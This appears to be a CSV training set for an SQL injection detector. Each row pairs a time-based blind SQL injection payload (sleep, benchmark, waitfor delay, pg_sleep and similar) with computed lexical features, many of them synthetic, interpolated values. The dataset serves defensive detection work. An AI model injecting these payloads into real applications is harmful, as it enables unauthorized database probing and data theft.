id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000032,attack,time,"1%' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '%'  =  '",nearest_attack_euclidean,R000124,1.4928279724825233,79.7423058852932,27.0,3.788692955765702,19.628847057353394,19.71961411970525,28.371152942646603,12.022691765587963,0.24885835943638454,0.24565064242599188,0.3552626700249005,0.15022832811272308,3.674230588529321,0.0,0.0,0.0,0.0,1.674230588529321,0.0,4.0,1.674230588529321,0.0,1.0,1.6742305885293212,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.32576941147067895,0.0,-2.7755575615628914e-17,0.0,1.674230588529321,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000033,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R000259,0.09000060361314231,72.86046245357235,26.98006606479605,3.8386221022917746,22.940198194388152,15.0,24.960132129592104,9.960132129592102,0.3148285246488524,0.20591387779087061,0.34258573767557376,0.13667185988470315,2.960132129592102,0.0,0.0,0.0,0.0,0.9800660647960512,0.0,4.019933935203949,0.9800660647960513,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9800660647960511,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,-2.7755575615628914e-17,0.0,0.9800660647960511,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.980066064796051
SMOTE_000034,attack,time,"1   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000278,1.2017943608890234,65.66181568224127,18.0,2.7523580476494827,10.584546079439685,10.0,35.66181568224126,9.415453920560315,0.16156502219197746,0.1524314897007324,0.5427055308978028,0.14329795720948732,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.415453920560315,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.5845460794396844,0.41545392056031566,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000035,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""witb""  =  ""witb",nearest_attack_euclidean,R000054,0.602830626984908,70.67607597167466,23.152370542879513,3.4697499962874514,23.60948217151806,4.0,29.914223257277087,13.152370542879515,0.3339682105953313,0.05675646668719228,0.42291217419810756,0.18636314851936883,2.0,3.999999999999999,0.0,0.0,0.0,0.8476294571204853,0.0,4.304741085759029,0.0,0.0,0.0,0.8476294571204854,1.0,1.0,0.0,0.0,0.0,0.8476294571204853,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000036,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000078,0.12335337345379573,66.45642648935909,26.0,3.6224077552632963,20.0,10.0,27.365141191487275,9.091285297871819,0.30108225996859117,0.15054112998429559,0.41160388464051745,0.13677272540659585,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.091285297871819,0.0,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000037,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'ecur'  =  'ecur,nearest_attack_euclidean,R000128,0.12313586326693493,77.0,18.416338063567437,2.632722719990906,18.0,2.0,44.0,13.0,0.23376623376623376,0.025974025974025983,0.5714285714285714,0.16883116883116883,4.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000038,attack,time,"1' where 5786  =  5786 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000291,0.5277819283740345,74.0,24.667454717211683,3.5477083673563232,16.0,18.0,30.0,10.0,0.21621621621621623,0.24324324324324326,0.40540540540540543,0.13513513513513514,0.8337273586058412,0.16627264139415865,2.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,4.0,0.8337273586058412,0.16627264139415876,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000039,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000007,0.4929178764231972,69.52140416098098,19.80351040245246,2.9397285386730037,20.521404160980985,2.0,36.0,11.0,0.2950732781277454,0.028772519260092014,0.5179053466816563,0.15824885593050614,4.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.2392979195095082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.239297919509508
SMOTE_000040,attack,time,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000162,0.4174603458312169,69.493445550296,25.0,3.584508769628813,15.0,21.0,26.794756440236796,6.6986891100592,0.2160901230784379,0.30252617230981305,0.38510696368939923,0.09627674092234981,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.6986891100592,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000041,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""zhxm""  =  ""zhxm",nearest_attack_euclidean,R000213,1.4065831524006631,73.0,23.562622642127273,3.566078608429096,23.171966981595457,10.0,29.218688678936363,10.609344339468182,0.317424205227335,0.136986301369863,0.4002560093004981,0.14533348410230384,0.0,3.999999999999999,0.0,0.0,0.0,1.6093443394681815,0.0,4.0,0.0,0.0,1.0,1.6093443394681815,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.6093443394681817,0.39065566053181844,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000042,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000155,0.6572411851650681,70.0,22.0,3.522413245720337,27.0,4.0,27.0,12.0,0.38571428571428573,0.057142857142857134,0.38571428571428573,0.17142857142857143,5.412385738097032,0.587614261902968,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,4.0,0.0,0.0,0.0,0.0,1.0,0.14690356547574202,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000043,attack,time,1'+  (  select 'toec' where 5810  =  5810 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000087,0.5685957513876759,71.56477685776541,23.0,3.5665742131948353,23.564776857765406,10.0,27.0,11.0,0.32917408627681644,0.13975539869232992,0.3773395764692907,0.1537309385615629,4.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.7176115711172969,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.717611571117297
SMOTE_000044,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000113,0.5026161321416004,83.19848035121586,25.099240175607928,3.4588055049563495,19.64886026341189,18.0,35.549620087803966,10.0,0.23529183117104324,0.21671922898061338,0.4275893681924471,0.12039957165589632,0.0,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000045,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""koni"" like ""koni",nearest_attack_euclidean,R000300,1.8708807963472849,73.58897651041964,23.196325503473215,3.4779842899897124,25.40489932870238,4.0,30.987751678244045,13.196325503473215,0.3480001061894822,0.05454685243369284,0.41866912327228806,0.17878391810453695,2.0,3.999999999999999,0.0,0.0,0.0,0.3987751678244047,0.0,4.797550335648809,0.0,0.0,0.0,0.3987751678244047,1.0,1.0,0.0,0.0,0.0,0.39877516782440475,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000046,attack,time,1   )    )    as skex where 7941  =  7941 and sleep  (  5  )  --,nearest_attack_euclidean,R000176,0.5336520900776359,64.22258874962962,22.667766248888867,3.3678780750500485,19.0,10.0,28.0,7.222588749629622,0.2958583686915955,0.1557149308903134,0.43600180649287756,0.11242489392521357,0.22258874962962216,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,0.222588749629622,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000047,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000205,1.149280613710727,72.48605223638607,17.44860522363861,2.7513099551887654,19.0,2.0,39.58884178910886,11.897210447277216,0.26334181891189,0.027720191464409474,0.5449742385274329,0.16396375109626768,4.0,0.0,0.0,0.0,0.0,1.0,0.0,6.8972104472772156,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000048,attack,time,1'||  (  select 'ywfo' from dual where 4168  =  4168 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000214,1.247656730725197,72.3844420402613,28.794814013420435,4.023260070386442,29.987035033551088,10.0,22.397407006710218,10.0,0.4116628444122655,0.13901224909485752,0.31031265739801944,0.13901224909485752,3.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0000000000000002,1.0,0.0,1.0,0.6987035033551088,0.30129649664489133,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000049,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000218,0.715037264949887,76.06440730967986,18.69529213763549,2.9570641261573583,28.369115172044367,1.6738230344088727,37.02146910322662,9.0,0.37237393839079735,0.021718481934709072,0.48720589175173024,0.11870168792276334,0.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000050,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000035,0.8225134156078372,65.17912492424539,21.27362502525154,3.2936697635582393,20.452749949496923,10.0,28.0,6.726374974748461,0.3136411431596065,0.1534893580465479,0.4297702025303341,0.10309929626351148,0.7263749747484614,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,1.0,0.7263749747484612,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.2736250252515388,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2736250252515386
SMOTE_000051,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,nearest_attack_euclidean,R000042,0.28025081420147935,84.89228580831548,23.0,3.2298218460165726,31.89228580831547,2.0,40.0,11.0,0.3756710291093445,0.023559583807194556,0.4711916761438909,0.12957771093957002,0.0,0.0,2.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.8922858083154714,0.10771419168452856,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000052,attack,time,1'||  (  select 'xemx' from dual where 4683  =  4683 or sleep  (  5  )  #,nearest_attack_euclidean,R000211,1.9996004350519736,70.02129439321953,28.16039827483678,3.991001313858436,27.941095255801145,10.0,22.08019913741839,10.0,0.3951170686016379,0.144065801183752,0.31675132903085806,0.144065801183752,3.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0000000000000002,1.0,0.0,1.0,0.540099568709195,1.1102230246251565e-16,0.4599004312908051,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000053,attack,time,"1%""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000135,0.0063968082810348355,69.97516478089481,20.0,2.8363524414342307,10.0,10.0,37.98013182471585,11.995032956178962,0.14291172575627512,0.14291172575627512,0.5427588936387047,0.17141765484874497,0.0,1.0,0.0,0.0,0.0,1.0,0.0,6.995032956178963,1.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000054,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000099,0.05049562027593676,83.92210838269361,21.019472904326598,2.949038819124468,28.0,2.0,42.92210838269361,11.0,0.33365788173877664,0.023832705838484042,0.511429530311077,0.13107988211166227,0.0,0.01947290432659876,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.980527095673402,0.0,0.0,0.0,1.0,0.0,0.019472904326598595,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000055,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000165,0.1486929766395193,64.12140006382137,23.939299968089315,3.4561140969193787,20.0,10.0,27.12140006382137,7.0,0.3119251890917549,0.15596259454587744,0.42293840018025347,0.10917381618211422,0.0,0.9392999680893156,0.0,0.0,0.0,1.0,0.0,4.0607000319106845,0.0,1.0,0.0,1.0,0.0,0.9392999680893158,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000056,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000007,0.49054804345326525,69.52350891851322,19.808772296283042,2.94003555693188,20.523508918513215,2.0,36.0,11.0,0.29509494474940073,0.028771634908187724,0.5178894283473789,0.15824399199503247,4.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.2382455407433919,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.238245540743392
SMOTE_000057,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000133,0.17306496711419106,68.06596486013888,25.93403513986112,3.6211780443232278,23.06596486013888,10.0,28.0,7.0,0.33886794942588444,0.1469182334609146,0.4113710536905608,0.1028427634226402,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,0.06596486013888159,0.9340351398611186,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000058,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000014,1.0598809102760038,80.65183394175659,20.0,2.972095575343597,28.89877737216227,2.0,40.20244525567546,9.550611313918864,0.3586675508101454,0.024806473003471233,0.498182075549801,0.11834390063658243,0.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,8.550611313918864,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.5506113139188642,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.550611313918864
SMOTE_000059,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'bbqk'  =  'bbqk,nearest_attack_euclidean,R000247,1.5108715637176617,73.19545440011632,23.61859505453488,3.4225829467892646,24.525619781860478,4.0,31.288429672790716,13.38140494546512,0.33492252060610467,0.05493083014484325,0.4268538894599975,0.18329275978905457,6.0,0.0,0.0,0.0,0.0,0.6185950545348803,0.0,4.76280989093024,0.0,0.0,0.0,0.6185950545348804,1.0,0.0,0.0,0.0,0.0,0.6185950545348804,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000060,attack,time,"1' where 5786  =  5786 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000291,0.3858087124245422,75.44339236910656,25.28867847382131,3.553138011237907,16.0,18.0,31.154713895285248,10.288678473821312,0.21226577524705698,0.23879899715293912,0.412614960174121,0.1363202674258829,1.0,0.0,2.0,0.0,0.0,2.0,0.0,4.288678473821312,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000061,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000108,0.24014760077439967,77.40816385099502,26.098639358167496,3.365565954986527,20.0,10.0,36.408163850995024,11.0,0.25851793500357895,0.12925896750178947,0.4700382332426631,0.14218486425196844,0.0,1.0,2.0,0.0,0.0,1.0,0.0,5.901360641832504,0.09863935816749603,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000062,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000043,0.0648002158388358,63.059427972106114,23.0,3.4622952024358655,19.0,10.0,27.039618648070743,7.019809324035371,0.3013157451972063,0.1585872343143191,0.428785815195188,0.11131120529328657,0.019809324035371167,0.9801906759646288,0.0,0.0,0.0,1.0,0.0,4.019809324035371,0.0,1.0,0.0,1.0,0.019809324035371112,0.9801906759646288,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,-2.7755575615628914e-17,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000063,attack,time,"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000221,0.03301166250361258,70.91204499570466,28.967016873389248,3.7926991666651673,24.0,9.989005624463083,27.94502812231541,8.978011248926165,0.3385000939197604,0.14086719190248878,0.39404420675266344,0.12658850742508737,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.989005624463083,0.0,1.0,0.9890056244630822,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
